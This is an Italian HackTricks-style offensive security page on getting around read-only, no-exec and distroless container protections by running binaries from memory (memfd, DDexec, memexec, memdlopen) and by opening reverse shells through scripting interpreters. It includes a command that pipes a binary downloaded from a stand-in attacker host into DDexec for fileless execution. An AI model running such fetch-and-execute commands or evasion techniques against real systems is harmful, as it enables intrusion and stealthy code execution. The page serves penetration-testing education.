# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Video

Nei video seguenti puoi trovare le tecniche menzionate in questa pagina spiegate più in dettaglio:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

È sempre più comune trovare macchine linux montate con **read-only (ro) protezione del file system**, specialmente nei container. Questo perché per eseguire un container con file system ro è sufficiente impostare **`readOnlyRootFilesystem: true`** nel `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Tuttavia, anche se il file system è montato come ro, **`/dev/shm`** resterà comunque scrivibile, quindi non è vero che non possiamo scrivere nulla sul disco. Questa cartella sarà però **montata con no-exec protection**, quindi se scarichi un binario qui **non potrai eseguirlo**.

> [!WARNING]
> Dal punto di vista del red team, questo rende **complicato scaricare e eseguire** binari che non sono già presenti nel sistema (come backdoors o enumerators come `kubectl`).

## Bypass più semplice: Scripts

Nota che ho parlato di binari: puoi **eseguire qualsiasi script** purché l'interprete sia presente sulla macchina, come uno **shell script** se è presente `sh` o uno **script Python** se `python` è installato.

Tuttavia, questo non basta per eseguire la tua backdoor binaria o altri tool binari di cui potresti aver bisogno.

## Bypass della memoria

Se vuoi eseguire un binario ma il file system non lo permette, il modo migliore è **eseguirlo dalla memoria**, poiché le **protezioni non si applicano lì**.

### FD + exec syscall bypass

Se hai alcuni potenti motori di scripting all'interno della macchina, come **Python**, **Perl**, o **Ruby**, puoi scaricare il binario da eseguire dalla memoria, memorizzarlo in un file descriptor di memoria (`create_memfd` syscall), che non sarà soggetto a quelle protezioni, e poi chiamare una **`exec` syscall** indicando il **fd come file da eseguire**.

Per questo puoi usare facilmente il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Puoi passargli un binario e genererà uno script nella lingua indicata con il **binario compresso e codificato in base64** con le istruzioni per **decodificarlo e decomprimerlo** in un **fd** creato chiamando la syscall `create_memfd` e una chiamata alla syscall **exec** per eseguirlo.

> [!WARNING]
> Questo non funziona in altri linguaggi di scripting come PHP o Node perché non hanno un modo **predefinito per chiamare raw syscalls** da uno script, quindi non è possibile chiamare `create_memfd` per creare il **memory fd** per memorizzare il binario.
>
> Inoltre, creare un **regular fd** con un file in `/dev/shm` non funzionerà, poiché non ti sarà permesso eseguirlo perché si applicherà la **no-exec protection**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) è una tecnica che ti permette di **modificare la memoria del tuo stesso processo** sovrascrivendo il suo **`/proc/self/mem`**.

Quindi, **controllando il codice assembly** che viene eseguito dal processo, puoi scrivere uno **shellcode** e "mutare" il processo per **eseguire qualsiasi codice arbitrario**.

> [!TIP]
> **DDexec / EverythingExec** ti permetterà di caricare e **eseguire** il tuo **shellcode** o **qualsiasi binario** dalla **memoria**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Per maggiori informazioni su questa tecnica controlla il Github o:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) è il naturale passo successivo a DDexec. È una **DDexec shellcode daemonizzata**, quindi ogni volta che vuoi **eseguire un binario diverso** non è necessario rilanciare DDexec: puoi semplicemente eseguire lo shellcode memexec tramite la tecnica DDexec e poi **comunicare con questo daemon per passare nuovi binari da caricare ed eseguire**.

Puoi trovare un esempio su come usare **memexec per eseguire binari da una PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Con uno scopo simile a DDexec, la tecnica [**memdlopen**](https://github.com/arget13/memdlopen) permette un **modo più semplice di caricare binari** in memoria per poi eseguirli. Potrebbe permettere anche di caricare binari con dipendenze.

## Distroless Bypass

Per una spiegazione dedicata di **cos'è effettivamente distroless**, quando aiuta, quando non aiuta, e come cambia il post-exploitation tradecraft nei container, consulta:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### Cos'è distroless

I container distroless contengono solo i **componenti strettamente necessari per eseguire una specifica applicazione o servizio**, come librerie e dipendenze di runtime, ma escludono componenti più grandi come un package manager, shell o utility di sistema.

L'obiettivo dei container distroless è di **ridurre la superficie di attacco dei container eliminando componenti non necessari** e minimizzare il numero di vulnerabilità che possono essere sfruttate.

### Reverse Shell

In un container distroless potresti **non trovare nemmeno `sh` o `bash`** per ottenere una shell normale. Non troverai inoltre binari come `ls`, `whoami`, `id`... tutto ciò che di solito esegui su un sistema.

> [!WARNING]
> Pertanto, **non** sarai in grado di ottenere una **reverse shell** o **enumerare** il sistema come fai di solito.

Tuttavia, se il container compromesso sta eseguendo ad esempio un'app Flask, allora Python è installato, e quindi puoi ottenere una **Python reverse shell**. Se sta eseguendo Node, puoi ottenere una Node rev shell, e lo stesso vale per praticamente qualsiasi **linguaggio di scripting**.

> [!TIP]
> Usando il linguaggio di scripting potresti **enumerare il sistema** sfruttando le capacità del linguaggio.

Se non ci sono protezioni **`read-only/no-exec`** potresti abusare della tua reverse shell per **scrivere nel file system i tuoi binari** ed **eseguirli**.

> [!TIP]
> Tuttavia, in questo tipo di container queste protezioni di solito esistono, ma potresti usare le **precedenti tecniche di esecuzione in memoria per bypassarle**.

Puoi trovare **esempi** su come **sfruttare alcune vulnerabilità RCE** per ottenere **reverse shell** tramite linguaggi di scripting ed eseguire binari dalla memoria in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
